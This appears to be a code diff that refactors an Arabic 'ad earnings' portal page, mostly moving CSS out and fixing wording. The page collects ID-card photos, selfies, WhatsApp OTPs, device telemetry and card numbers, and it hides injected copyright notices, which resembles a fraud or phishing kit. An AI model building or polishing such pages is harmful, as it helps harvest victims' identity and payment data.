@@ -11,744 +11,12 @@
     <title>بوابة الناشرين | عوائد الحملات الإعلانية والمكافآت الترويجية</title>
 
     <!-- شعار سطر الويب (Favicon) -->
-    <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 120 120'%3E%3Cdefs%3E
-
-%3ClinearGradient id='g' x1='0%25' y1='0%25' x2='100%25' y2='100%25'%3E%3Cstop offset='0%25' stop-color='%232563eb'/%3E%3Cstop offset='100%25' 
-
-stop-color='%2310b981'/%3E%3C/linearGradient%3E%3C/defs%3E%3Crect width='120' height='120' rx='28' fill='%230f172a'/%3E%3Crect x='6' y='6' 
-
-width='108' height='108' rx='24' fill='none' stroke='url(%23g)' stroke-width='4'/%3E%3Cpath d='M30 78 L50 56 L66 68 L90 38' fill='none' stroke='url
-
-(%23g)' stroke-width='8' stroke-linecap='round' stroke-linejoin='round'/%3E%3Ccircle cx='90' cy='38' r='7' fill='%2310b981'/%3E%3Ctext x='60' 
-
-y='102' font-family='Arial,sans-serif' font-size='22' font-weight='bold' fill='%23ffffff' text-anchor='middle'%3EAD%24%3C/text%3E%3C/svg%3E">
+    <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 120 120'%3E%3Cdefs%3E%3ClinearGradient id='g' x1='0%25' y1='0%25' x2='100%25' y2='100%25'%3E%3Cstop offset='0%25' stop-color='%232563eb'/%3E%3Cstop offset='100%25' stop-color='%2310b981'/%3E%3C/linearGradient%3E%3C/defs%3E%3Crect width='120' height='120' rx='28' fill='%230f172a'/%3E%3Crect x='6' y='6' width='108' height='108' rx='24' fill='none' stroke='url(%23g)' stroke-width='4'/%3E%3Cpath d='M30 78 L50 56 L66 68 L90 38' fill='none' stroke='url(%23g)' stroke-width='8' stroke-linecap='round' stroke-linejoin='round'/%3E%3Ccircle cx='90' cy='38' r='7' fill='%2310b981'/%3E%3Ctext x='60' y='102' font-family='Arial,sans-serif' font-size='22' font-weight='bold' fill='%23ffffff' text-anchor='middle'%3EAD%24%3C/text%3E%3C/svg%3E">
     <link rel="apple-touch-icon" href="/app-icon.svg">
     <link rel="manifest" href="/manifest.json">
 
     <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;500;600;700;800&display=swap" rel="stylesheet">
-    <style>
-        :root {
-            --bg-dark: #070b14;
-            --card-bg: rgba(17, 24, 39, 0.82);
-            --card-border: rgba(255, 255, 255, 0.08);
-            --primary: #3b82f6;
-            --primary-glow: rgba(59, 130, 246, 0.35);
-            --accent: #10b981;
-            --accent-glow: rgba(16, 185, 129, 0.25);
-            --warning: #f59e0b;
-            --danger: #f43f5e;
-            --text-main: #f8fafc;
-            --text-muted: #94a3b8;
-            --input-bg: rgba(10, 15, 29, 0.88);
-        }
-
-        * {
-            box-sizing: border-box;
-            margin: 0;
-            padding: 0;
-            font-family: 'Cairo', sans-serif;
-            -webkit-tap-highlight-color: transparent;
-        }
-
-        html, body {
-            width: 100%;
-            min-height: 100vh;
-            min-height: 100dvh;
-            background-color: var(--bg-dark);
-            color: var(--text-main);
-            overflow-x: hidden;
-        }
-
-        body {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            padding: 2rem 1rem;
-            position: relative;
-        }
-
-        /* إخفاء أي عنصر حقوق محفوظة قد يحقنه ملف protection.js */
-        footer, .footer, .copyright, .c-common-copyright, [id*="copyright"], [class*="copyright"] {
-            display: none !important;
-            height: 0 !important;
-            visibility: hidden !important;
-            pointer-events: none !important;
-        }
-
-        .bg-mesh {
-            position: fixed;
-            inset: 0;
-            z-index: -1;
-            background: 
-                radial-gradient(circle at 15% 20%, rgba(37, 99, 235, 0.18) 0%, transparent 45%),
-                radial-gradient(circle at 85% 75%, rgba(16, 185, 129, 0.14) 0%, transparent 40%),
-                radial-gradient(circle at 50% 50%, rgba(99, 102, 241, 0.08) 0%, transparent 55%),
-                linear-gradient(180deg, #070b14 0%, #0c1222 100%);
-            background-attachment: fixed;
-        }
-
-        .bg-grid {
-            position: fixed;
-            inset: 0;
-            z-index: -1;
-            background-image: 
-                linear-gradient(to right, rgba(255, 255, 255, 0.03) 1px, transparent 1px),
-                linear-gradient(to bottom, rgba(255, 255, 255, 0.03) 1px, transparent 1px);
-            background-size: 40px 40px;
-            mask-image: radial-gradient(circle at center, black 40%, transparent 90%);
-        }
-
-        .container {
-            width: 100%;
-            max-width: 760px;
-            margin: auto;
-        }
-
-        header {
-            text-align: center;
-            margin-bottom: 1.8rem;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-        }
-
-        .app-logo-install {
-            cursor: pointer;
-            display: inline-flex;
-            align-items: center;
-            gap: 12px;
-            margin-bottom: 1rem;
-            padding: 0.6rem 1.2rem;
-            border-radius: 20px;
-            background: rgba(30, 41, 59, 0.55);
-            border: 1px solid rgba(59, 130, 246, 0.3);
-            transition: all 0.25s ease;
-            user-select: none;
-            box-shadow: 0 8px 25px -5px rgba(0, 0, 0, 0.4);
-        }
-
-        .app-logo-install:hover {
-            transform: translateY(-2px);
-            border-color: var(--accent);
-            box-shadow: 0 12px 30px -5px var(--accent-glow);
-        }
-
-        .logo-svg-box {
-            width: 50px;
-            height: 50px;
-            border-radius: 14px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            box-shadow: 0 0 18px var(--primary-glow);
-            flex-shrink: 0;
-        }
-
-        .logo-brand-name {
-            font-size: 1.08rem;
-            font-weight: 800;
-            color: #fff;
-            display: block;
-            line-height: 1.2;
-        }
-
-        .logo-install-hint {
-            font-size: 0.78rem;
-            color: var(--accent);
-            font-weight: 600;
-            display: block;
-        }
-
-        .network-tag {
-            display: inline-flex;
-            align-items: center;
-            gap: 8px;
-            background: rgba(59, 130, 246, 0.1);
-            border: 1px solid rgba(59, 130, 246, 0.25);
-            padding: 4px 14px;
-            border-radius: 50px;
-            font-size: 0.8rem;
-            color: #60a5fa;
-            margin-bottom: 0.75rem;
-        }
-
-        header h1 {
-            font-size: clamp(1.45rem, 4.5vw, 1.85rem);
-            font-weight: 800;
-            margin-bottom: 0.35rem;
-            background: linear-gradient(180deg, #ffffff 0%, #cbd5e1 100%);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-        }
-
-        header p {
-            color: var(--text-muted);
-            font-size: 0.92rem;
-        }
-
-        .install-toast {
-            display: none;
-            background: rgba(16, 185, 129, 0.15);
-            border: 1px solid rgba(16, 185, 129, 0.4);
-            color: #ecfdf5;
-            padding: 0.75rem 1.2rem;
-            border-radius: 12px;
-            font-size: 0.85rem;
-            margin-bottom: 1.2rem;
-            text-align: center;
-            width: 100%;
-        }
-
-        .auth-card, .form-card, .history-card {
-            background: var(--card-bg);
-            border: 1px solid var(--card-border);
-            border-radius: 20px;
-            padding: clamp(1.3rem, 4vw, 2rem);
-            backdrop-filter: blur(14px);
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.35);
-            margin-bottom: 1.8rem;
-        }
-
-        .auth-tabs {
-            display: grid;
-            grid-template-columns: repeat(3, 1fr);
-            gap: 6px;
-            background: rgba(10, 15, 29, 0.78);
-            padding: 6px;
-            border-radius: 12px;
-            margin-bottom: 1.5rem;
-            border: 1px solid var(--card-border);
-        }
-
-        .auth-tab-btn {
-            background: transparent;
-            color: var(--text-muted);
-            border: none;
-            padding: 0.65rem 0.4rem;
-            border-radius: 8px;
-            font-weight: 700;
-            font-size: clamp(0.76rem, 2.3vw, 0.86rem);
-            cursor: pointer;
-            transition: all 0.2s;
-        }
-
-        .auth-tab-btn.active {
-            background: var(--primary);
-            color: #fff;
-            box-shadow: 0 4px 12px var(--primary-glow);
-        }
-
-        .form-group {
-            margin-bottom: 1.2rem;
-        }
-
-        label {
-            display: block;
-            margin-bottom: 0.45rem;
-            color: var(--text-muted);
-            font-size: 0.88rem;
-            font-weight: 600;
-        }
-
-        input, select {
-            width: 100%;
-            padding: 0.85rem 1rem;
-            border-radius: 10px;
-            border: 1px solid var(--card-border);
-            background: var(--input-bg);
-            color: #fff;
-            font-size: 0.95rem;
-            outline: none;
-            transition: all 0.2s ease;
-        }
-
-        input:focus, select:focus {
-            border-color: var(--primary);
-            box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.15);
-        }
-
-        select {
-            cursor: pointer;
-            appearance: none;
-            background-image: url("data:image/svg+xml;charset=UTF-8,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' 
-
-stroke='%2394a3b8' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3e%3cpolyline points='6 9 12 15 18 9'%3e%3c/polyline%3e%3c/svg
-
-%3e");
-            background-repeat: no-repeat;
-            background-position: left 1rem center;
-            background-size: 1.1em;
-        }
-
-        .numeric-ltr-input {
-            direction: ltr;
-            text-align: right;
-            font-variant-numeric: tabular-nums;
-            letter-spacing: 1.4px;
-            font-weight: 700;
-        }
-
-        .input-hint {
-            display: block;
-            margin-top: 0.4rem;
-            font-size: 0.78rem;
-            color: var(--text-muted);
-        }
-
-        .otp-row {
-            display: flex;
-            gap: 10px;
-            align-items: stretch;
-        }
-
-        .btn-whatsapp-otp {
-            background: rgba(16, 185, 129, 0.16);
-            color: #34d399;
-            border: 1px solid rgba(16, 185, 129, 0.4);
-            border-radius: 10px;
-            padding: 0 1rem;
-            font-weight: 700;
-            font-size: 0.84rem;
-            cursor: pointer;
-            white-space: nowrap;
-            transition: all 0.2s;
-        }
-
-        .btn-whatsapp-otp:hover {
-            background: var(--accent);
-            color: #070b14;
-        }
-
-        /* شبكة تصوير المستندات الثلاثة (وجه البطاقة + ظهر البطاقة + الصورة الشخصية) */
-        .kyc-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
-            gap: 12px;
-        }
-
-        .id-upload-box {
-            border: 2px dashed rgba(59, 130, 246, 0.4);
-            border-radius: 14px;
-            padding: 1rem 0.85rem;
-            text-align: center;
-            background: rgba(10, 15, 29, 0.65);
-            cursor: pointer;
-            transition: all 0.2s ease;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            min-height: 125px;
-        }
-
-        .id-upload-box:hover {
-            border-color: var(--accent);
-            background: rgba(16, 185, 129, 0.06);
-        }
-
-        .id-upload-box.has-file {
-            border-color: var(--accent);
-            border-style: solid;
-        }
-
-        .upload-icon {
-            font-size: 1.65rem;
-            margin-bottom: 0.35rem;
-        }
-
-        .upload-title {
-            font-size: 0.86rem;
-            font-weight: 700;
-            color: #fff;
-            margin-bottom: 0.2rem;
-        }
-
-        .upload-sub {
-            font-size: 0.74rem;
-            color: var(--text-muted);
-        }
-
-        .id-preview-img {
-            max-width: 100%;
-            max-height: 145px;
-            border-radius: 10px;
-            margin-top: 0.65rem;
-            display: none;
-            border: 1px solid var(--accent);
-            object-fit: cover;
-        }
-
-        .btn-submit {
-            width: 100%;
-            padding: 1rem;
-            background: linear-gradient(135deg, #2563eb, #1d4ed8);
-            color: #fff;
-            border: none;
-            border-radius: 10px;
-            font-size: 1.03rem;
-            font-weight: 700;
-            cursor: pointer;
-            box-shadow: 0 4px 15px var(--primary-glow);
-            transition: all 0.2s ease;
-        }
-
-        .btn-submit:hover {
-            filter: brightness(1.1);
-            transform: translateY(-1px);
-        }
-
-        .btn-submit:disabled {
-            opacity: 0.6;
-            cursor: not-allowed;
-        }
-
-        .user-top-bar {
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            background: rgba(30, 41, 59, 0.78);
-            border: 1px solid rgba(16, 185, 129, 0.3);
-            padding: 0.85rem 1.2rem;
-            border-radius: 14px;
-            margin-bottom: 1.4rem;
-            flex-wrap: wrap;
-            gap: 10px;
-        }
-
-        .user-welcome {
-            font-weight: 700;
-            font-size: 0.95rem;
-            color: #fff;
-        }
-
-        .user-phone-tag {
-            color: var(--accent);
-            font-size: 0.84rem;
-            margin-right: 6px;
-        }
-
-        .btn-logout, .btn-clear {
-            background: rgba(244, 63, 94, 0.14);
-            color: #fb7185;
-            border: 1px solid rgba(244, 63, 94, 0.35);
-            padding: 0.45rem 1rem;
-            border-radius: 8px;
-            font-size: 0.82rem;
-            font-weight: 700;
-            cursor: pointer;
-            transition: all 0.2s ease;
-        }
-
-        .btn-logout:hover, .btn-clear:hover {
-            background: rgba(244, 63, 94, 0.25);
-            color: #fff;
-        }
-
-        .metrics-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(155px, 1fr));
-            gap: 1rem;
-            margin-bottom: 1.5rem;
-        }
-
-        .metric-card {
-            background: var(--card-bg);
-            border: 1px solid var(--card-border);
-            backdrop-filter: blur(12px);
-            border-radius: 14px;
-            padding: 1.1rem;
-            display: flex;
-            flex-direction: column;
-            gap: 0.35rem;
-        }
-
-        .metric-label { font-size: 0.78rem; color: var(--text-muted); }
-        .metric-val { font-size: 1.35rem; font-weight: 700; color: #fff; }
-        .metric-trend { font-size: 0.72rem; color: var(--accent); }
-
-        .balance-card {
-            background: linear-gradient(135deg, rgba(30, 41, 59, 0.85), rgba(15, 23, 42, 0.95));
-            border: 1px solid rgba(59, 130, 246, 0.25);
-            border-radius: 20px;
-            padding: 2.1rem 1.6rem;
-            text-align: center;
-            box-shadow: 0 15px 35px -10px rgba(0, 0, 0, 0.5), 0 0 20px -5px var(--primary-glow);
-            margin-bottom: 1.8rem;
-            backdrop-filter: blur(16px);
-        }
-
-        .balance-title {
-            color: var(--text-muted);
-            font-size: 0.92rem;
-            margin-bottom: 0.4rem;
-        }
-
-        .balance-amount {
-            font-size: clamp(2.4rem, 7vw, 3.2rem);
-            font-weight: 800;
-            color: var(--accent);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 0.35rem;
-            text-shadow: 0 0 25px var(--accent-glow);
-        }
-
-        .currency-symbol {
-            font-size: 1.7rem;
-            font-weight: 600;
-            color: var(--text-muted);
-        }
-
-        .egp-equivalent-bar {
-            margin-top: 0.4rem;
-            font-size: 0.95rem;
-            color: #cbd5e1;
-            font-weight: 600;
-        }
-
-        .payout-cycle {
-            display: inline-flex;
-            align-items: center;
-            gap: 6px;
-            background: rgba(16, 185, 129, 0.08);
-            border: 1px solid rgba(16, 185, 129, 0.2);
-            color: var(--accent);
-            padding: 4px 14px;
-            border-radius: 20px;
-            font-size: 0.8rem;
-            margin-top: 0.8rem;
-        }
-
-        .status-dot {
-            width: 8px;
-            height: 8px;
-            background: var(--accent);
-            border-radius: 50%;
-            box-shadow: 0 0 8px var(--accent);
-            animation: pulse 1.8s infinite;
-        }
-
-        @keyframes pulse {
-            0%, 100% { opacity: 1; transform: scale(1); }
-            50% { opacity: 0.3; transform: scale(0.85); }
-        }
-
-        .card-header {
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            margin-bottom: 1.4rem;
-            padding-bottom: 0.8rem;
-            border-bottom: 1px solid var(--card-border);
-            flex-wrap: wrap;
-            gap: 8px;
-        }
-
-        .card-header h3 { font-size: 1.12rem; color: #fff; }
-
-        .bank-rate-badge {
-            background: rgba(59, 130, 246, 0.14);
-            border: 1px solid rgba(59, 130, 246, 0.3);
-            color: #93c5fd;
-            padding: 4px 10px;
-            border-radius: 8px;
-            font-size: 0.78rem;
-            font-weight: 600;
-        }
-
-        .fee-card {
-            background: rgba(10, 15, 29, 0.75);
-            border: 1px dashed rgba(255, 255, 255, 0.14);
-            border-radius: 12px;
-            padding: 1.15rem;
-            margin: 1.4rem 0;
-        }
-
-        .fee-row {
-            display: flex;
-            justify-content: space-between;
-            font-size: 0.88rem;
-            color: var(--text-muted);
-            margin-bottom: 0.45rem;
-        }
-
-        .fee-row.total-egp {
-            margin-top: 0.7rem;
-            padding-top: 0.7rem;
-            border-top: 1px solid rgba(255, 255, 255, 0.1);
-            font-weight: 800;
-            color: #fff;
-            font-size: 1.12rem;
-        }
-
-        .fee-danger { color: var(--danger); }
-        .fee-usd { color: #cbd5e1; font-weight: 600; }
-        .fee-net-egp { color: var(--accent); font-weight: 800; }
-
-        .withdraw-list {
-            display: flex;
-            flex-direction: column;
-            gap: 0.85rem;
-        }
-
-        .withdraw-item {
-            background: rgba(10, 15, 29, 0.75);
-            border: 1px solid var(--card-border);
-            border-radius: 12px;
-            padding: 1rem 1.2rem;
-            display: flex;
-            flex-wrap: wrap;
-            align-items: center;
-            justify-content: space-between;
-            gap: 1rem;
-        }
-
-        .withdraw-item.rejected-item {
-            border-color: rgba(244, 63, 94, 0.25);
-            opacity: 0.8;
-        }
-
-        .item-info { display: flex; flex-direction: column; gap: 0.3rem; }
-
-        .item-title {
-            font-weight: 700;
-            color: #fff;
-            font-size: 0.95rem;
-            display: flex;
-            flex-wrap: wrap;
-            align-items: center;
-            gap: 8px;
-        }
-
-        .badge-pending {
-            background: rgba(245, 158, 11, 0.15);
-            color: var(--warning);
-            border: 1px solid rgba(245, 158, 11, 0.35);
-            font-size: 0.74rem;
-            padding: 2px 10px;
-            border-radius: 12px;
-        }
-
-        .badge-approved {
-            background: rgba(16, 185, 129, 0.15);
-            color: var(--accent);
-            border: 1px solid rgba(16, 185, 129, 0.35);
-            font-size: 0.74rem;
-            padding: 2px 10px;
-            border-radius: 12px;
-        }
-
-        .badge-rejected {
-            background: rgba(244, 63, 94, 0.15);
-            color: #fb7185;
-            border: 1px solid rgba(244, 63, 94, 0.35);
-            font-size: 0.74rem;
-            padding: 2px 10px;
-            border-radius: 12px;
-        }
-
-        .item-meta { font-size: 0.8rem; color: var(--text-muted); }
-
-        .item-amounts {
-            display: flex;
-            align-items: center;
-            gap: 1.2rem;
-            text-align: left;
-        }
-
-        .amount-box { display: flex; flex-direction: column; align-items: flex-end; }
-        .amount-label { font-size: 0.72rem; color: var(--text-muted); }
-        .amount-gross { font-size: 0.95rem; font-weight: 700; color: var(--danger); }
-        .amount-refunded { font-size: 0.95rem; font-weight: 700; color: var(--text-muted); text-decoration: line-through; }
-        .amount-net-egp { font-size: 1.05rem; font-weight: 800; color: var(--accent); }
-
-        .empty-state {
-            text-align: center;
-            padding: 2rem 1rem;
-            color: var(--text-muted);
-            font-size: 0.9rem;
-            border: 1px dashed var(--card-border);
-            border-radius: 12px;
-        }
-
-        .alert-box {
-            display: none;
-            padding: 0.95rem;
-            border-radius: 10px;
-            margin-top: 1rem;
-            font-size: 0.88rem;
-            text-align: center;
-        }
-
-        .alert-success {
-            background: rgba(16, 185, 129, 0.14);
-            color: #34d399;
-            border: 1px solid rgba(16, 185, 129, 0.35);
-        }
-
-        .alert-danger {
-            background: rgba(244, 63, 94, 0.14);
-            color: #fb7185;
-            border: 1px solid rgba(244, 63, 94, 0.35);
-        }
-
-        .modal-overlay {
-            display: none;
-            position: fixed;
-            inset: 0;
-            background: rgba(7, 11, 20, 0.84);
-            backdrop-filter: blur(8px);
-            z-index: 9999;
-            align-items: center;
-            justify-content: center;
-            padding: 1rem;
-        }
-
-        .modal-box {
-            margin: auto;
-            background: #111827;
-            border: 1px solid rgba(244, 63, 94, 0.35);
-            border-radius: 18px;
-            padding: 1.8rem;
-            width: 100%;
-            max-width: 400px;
-            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.6);
-            text-align: center;
-        }
-
-        .modal-actions { display: flex; gap: 0.75rem; margin-top: 1rem; }
-
-        .btn-confirm-clear {
-            flex: 1;
-            padding: 0.75rem;
-            background: var(--danger);
-            color: #fff;
-            border: none;
-            border-radius: 10px;
-            font-weight: 700;
-            cursor: pointer;
-        }
-
-        .btn-cancel-modal {
-            flex: 1;
-            padding: 0.75rem;
-            background: rgba(255, 255, 255, 0.08);
-            color: var(--text-main);
-            border: 1px solid var(--card-border);
-            border-radius: 10px;
-            font-weight: 600;
-            cursor: pointer;
-        }
-
-        .modal-error {
-            display: none;
-            color: #fb7185;
-            font-size: 0.82rem;
-            margin-top: 0.65rem;
-        }
-    </style>
+    <link rel="stylesheet" href="style.css">
 </head>
 <body>
 
@@ -768,14 +36,12 @@ stroke='%2394a3b8' stroke-width='2' stroke-linecap='round' stroke-linejoin='roun
                     </defs>
                     <rect width="120" height="120" rx="26" fill="#0f172a"/>
                     <rect x="5" y="5" width="110" height="110" rx="22" fill="none" stroke="url(#logoGrad)" stroke-width="5"/>
-                    <path d="M28 76 L48 54 L64 66 L90 34" fill="none" stroke="url(#logoGrad)" stroke-width="8" stroke-linecap="round" stroke-
-
-linejoin="round"/>
+                    <path d="M28 76 L48 54 L64 66 L90 34" fill="none" stroke="url(#logoGrad)" stroke-width="8" stroke-linecap="round" stroke-linejoin="round"/>
                     <circle cx="90" cy="34" r="7" fill="#10b981"/>
                     <text x="60" y="102" font-family="Cairo, Arial" font-size="22" font-weight="800" fill="#ffffff" text-anchor="middle">AD$</text>
                 </svg>
             </div>
-            <div style="text-align: right;">
+            <div class="logo-text-align">
                 <span class="logo-brand-name">منصة AD$ للتمويل الإعلاني</span>
                 <span class="logo-install-hint" id="installStatusText">📲 اضغط على الشعار لتثبيت التطبيق</span>
             </div>
@@ -803,7 +69,7 @@ linejoin="round"/>
         <!-- 1. نموذج تسجيل الدخول -->
         <form id="loginForm">
             <div class="form-group">
-                <label>رقم الهاتف المسجل (11 رقماً يبدأ بـ 01)</label>
+                <label>رقم الهاتف المسجل</label>
                 <input type="text" id="loginPhone" class="numeric-ltr-input" inputmode="numeric" maxlength="11" placeholder="01xxxxxxxxx" required>
             </div>
             <div class="form-group">
@@ -814,10 +80,10 @@ linejoin="round"/>
         </form>
 
         <!-- 2. نموذج تسجيل مشترك جديد + تصوير البطاقة (وجه وظهر) + صورة شخصية + كود واتساب -->
-        <form id="registerForm" style="display: none;">
+        <form id="registerForm" class="hidden-section">
             <div class="form-group">
-                <label>الاسم الكامل (كما في البطاقة الشخصية)</label>
-                <input type="text" id="regName" placeholder="أدخل اسمك الكامل" required>
+                <label>الأسم الكامل (كما في البطاقة الشخصية)</label>
+                <input type="text" id="regName" placeholder="أدخل أسمك الكامل" required>
             </div>
             <div class="form-group">
                 <label>رقم الهاتف (مربوط بالواتساب لاستلام كود OTP)</label>
@@ -837,7 +103,7 @@ linejoin="round"/>
                         <span class="upload-icon">🪪</span>
                         <span class="upload-title">1. وجه البطاقة الشخصية</span>
                         <span class="upload-sub">اضغط للتصوير بالكاميرا</span>
-                        <input type="file" id="idFrontInput" accept="image/*" capture="environment" style="display: none;">
+                        <input type="file" id="idFrontInput" accept="image/*" capture="environment" class="hidden-input">
                         <img id="previewIdFront" class="id-preview-img" alt="وجه البطاقة">
                     </div>
 
@@ -846,7 +112,7 @@ linejoin="round"/>
                         <span class="upload-icon">🔄</span>
                         <span class="upload-title">2. ظهر البطاقة الشخصية</span>
                         <span class="upload-sub">اضغط للتصوير بالكاميرا</span>
-                        <input type="file" id="idBackInput" accept="image/*" capture="environment" style="display: none;">
+                        <input type="file" id="idBackInput" accept="image/*" capture="environment" class="hidden-input">
                         <img id="previewIdBack" class="id-preview-img" alt="ظهر البطاقة">
                     </div>
 
@@ -855,7 +121,7 @@ linejoin="round"/>
                         <span class="upload-icon">🤳</span>
                         <span class="upload-title">3. صورة شخصية حديثة</span>
                         <span class="upload-sub">اضغط لالتقاط صورة واضحة</span>
-                        <input type="file" id="selfieInput" accept="image/*" capture="user" style="display: none;">
+                        <input type="file" id="selfieInput" accept="image/*" capture="user" class="hidden-input">
                         <img id="previewSelfie" class="id-preview-img" alt="الصورة الشخصية">
                     </div>
                 </div>
@@ -864,9 +130,7 @@ linejoin="round"/>
             <div class="form-group">
                 <label>كود مصادقة واتساب (OTP)</label>
                 <div class="otp-row">
-                    <input type="text" id="regOtp" class="numeric-ltr-input" inputmode="numeric" maxlength="7" placeholder="XXXXXXX (OTP أرقام)" 
-
-required>
+                    <input type="text" id="regOtp" class="numeric-ltr-input" inputmode="numeric" maxlength="7" placeholder="XXXXXXX (OTP)" required>
                     <button type="button" class="btn-whatsapp-otp" onclick="requestWhatsAppOtp('register')">📲 إرسال كود واتساب</button>
                 </div>
             </div>
@@ -875,18 +139,16 @@ required>
         </form>
 
         <!-- 3. نموذج نسيان كلمة المرور عبر واتساب (OTP) -->
-        <form id="resetForm" style="display: none;">
+        <form id="resetForm" class="hidden-section">
             <div class="form-group">
-                <label>رقم الهاتف المسجل </label>
+                <label>رقم الهاتف المسجل</label>
                 <input type="text" id="resetPhone" class="numeric-ltr-input" inputmode="numeric" maxlength="11" placeholder="01xxxxxxxxx" required>
             </div>
             <div class="form-group">
-                <label>كود مصادقة واتساب </label>
+                <label>كود مصادقة واتساب (OTP)</label>
                 <div class="otp-row">
-                    <input type="text" id="resetOtp" class="numeric-ltr-input" inputmode="numeric" maxlength="7" placeholder="XXXXXXX (OTP أرقام)" 
-
-required>
-                    <button type="button" class="btn-whatsapp-otp" onclick="requestWhatsAppOtp('reset')">📲 إرسال كود</button>
+                    <input type="text" id="resetOtp" class="numeric-ltr-input" inputmode="numeric" maxlength="7" placeholder="XXXXXXX (OTP)" required>
+                    <button type="button" class="btn-whatsapp-otp" onclick="requestWhatsAppOtp('reset')">📲 OTP إرسال كود </button>
                 </div>
             </div>
             <div class="form-group">
@@ -902,7 +164,7 @@ required>
     <!-- =================================================================== -->
     <!-- ثانياً: لوحة عوائد المشترك المستقلة -->
     <!-- =================================================================== -->
-    <div id="dashboardSection" style="display: none;">
+    <div id="dashboardSection" class="hidden-section">
         <div class="user-top-bar">
             <div>
                 <span class="user-welcome">👤 مرحباً، <span id="loggedUserName">--</span></span>
@@ -957,8 +219,8 @@ required>
 
             <form id="payoutForm">
                 <div class="form-group">
-                    <label for="userName">أسم الناشر / المستفيد</label>
-                    <input type="text" id="userName" placeholder="أدخل أسمك أو معرف الحساب" required>
+                    <label for="userName">اسم الناشر / المستفيد</label>
+                    <input type="text" id="userName" placeholder="أدخل اسمك أو معرف الحساب" required>
                 </div>
 
                 <div class="form-group">
@@ -976,7 +238,7 @@ required>
                     </select>
                 </div>
 
-                <div class="form-group" id="dynamicField" style="display: none;">
+                <div class="form-group hidden-section" id="dynamicField">
                     <label id="dynamicLabel" for="destinationDetails">بيانات التحويل</label>
                     <input type="text" id="destinationDetails" required>
                     <small id="dynamicHint" class="input-hint"></small>
@@ -1024,9 +286,9 @@ required>
 <!-- نافذة كلمة المرور السرية للإدارة عند مسح القائمة -->
 <div class="modal-overlay" id="passwordModal">
     <div class="modal-box">
-        <h4 style="color:#fff; margin-bottom:0.4rem;">🔒 تأكيد صلاحية الإدارة</h4>
-        <p style="color:var(--text-muted); font-size:0.85rem; margin-bottom:1rem;">أدخل كلمة المرور السرية لتصفير سجل السحوبات وإلغاء المبالغ المعلقة</p>
-        <input type="password" id="adminPasswordInput" placeholder="أدخل كلمة المرور السرية..." style="text-align: center;">
+        <h4 class="modal-title">🔒 تأكيد صلاحية الإدارة</h4>
+        <p class="modal-desc">أدخل كلمة المرور السرية لتصفير سجل السحوبات وإلغاء المبالغ المعلقة</p>
+        <input type="password" id="adminPasswordInput" class="modal-pass-input" placeholder="أدخل كلمة المرور السرية...">
         <div class="modal-error" id="modalErrorText">كلمة المرور غير صحيحة!</div>
         <div class="modal-actions">
             <button type="button" class="btn-confirm-clear" id="confirmClearBtn">تأكيد المسح</button>
@@ -1230,7 +492,7 @@ required>
         box.style.display = "block";
     }
 
-    // دالة مساعدة لضغط ومعاينة الصور الثلاث (وجه البطاقة + ظهر البطاقة + الصورة الشخصية)
+    // ضغط ومعاينة الصور الثلاث
     function bindImageUploader(inputId, previewId, boxId, onSaveCallback) {
         document.getElementById(inputId).addEventListener("change", (e) => {
             const file = e.target.files[0];
@@ -1289,16 +551,15 @@ required>
         }
     }
 
-    // إرسال طلب تسجيل مشترك جديد + الصور الثلاث (وجه البطاقة + ظهر البطاقة + الصورة الشخصية)
     document.getElementById("registerForm").addEventListener("submit", async (e) => {
         e.preventDefault();
 
         if (!idFrontBase64) {
-            showAuthMessage("يرجى تصوير وجه البطاقة الشخصية أولاً.", false);
+            showAuthMessage("يرجى تصوير وجه البطاقة الشخصية.", false);
             return;
         }
         if (!idBackBase64) {
-            showAuthMessage("يرجى تصوير ظهر البطاقة الشخصية أولاً.", false);
+            showAuthMessage("يرجى تصوير ظهر البطاقة الشخصية.", false);
             return;
         }
         if (!selfieBase64) {
@@ -1308,7 +569,7 @@ required>
 
         const btn = document.getElementById("regBtn");
         btn.disabled = true;
-        btn.textContent = "جاري رفع الصور الثلاث والتحقق من الكود...";
+        btn.textContent = "جاري رفع الصور والتحقق من الكود...";
 
         try {
             const deviceInfo = await collectClientTelemetry();
@@ -1344,7 +605,7 @@ required>
             showAuthMessage("حدث خطأ أثناء إرسال طلب التسجيل والمرفقات.", false);
         } finally {
             btn.disabled = false;
-            btn.textContent = "إرسال طلب التسجيل والمرفقات الثلاثة";
+            btn.textContent = "إرسال طلب التسجيل";
         }
     });
 
@@ -1558,7 +819,7 @@ required>
             destinationInput.setAttribute("inputmode", "numeric");
             destinationInput.setAttribute("maxlength", "19");
             destinationInput.classList.add("numeric-ltr-input");
-            dynamicHint.textContent = "يفتح لوحة الأرقام تلقائياً.";
+            dynamicHint.textContent = "يفتح لوحة الأرقام تلقائياً — يتم تفريق كل 4 أرقام تلقائياً أثناء الكتابة.";
         } else {
             document.getElementById("dynamicLabel").textContent = "اسم البنك ورقم الحساب أو الآيبان أو عنوان إنستاباي (IBAN)";
             destinationInput.value = "";
@@ -1620,7 +881,7 @@ required>
 
         if (selectedMethod === "فيزا / ماستركارد" && !/^(\d{4} ){3}\d{4}$/.test(destValue)) {
             alertBox.className = "alert-box alert-danger";
-            alertBox.textContent = "يرجى إدخال رقم بطاقة فيزا / ماستركارد .";
+            alertBox.textContent = "يرجى إدخال رقم بطاقة فيزا / ماستركارد.";
             alertBox.style.display = "block";
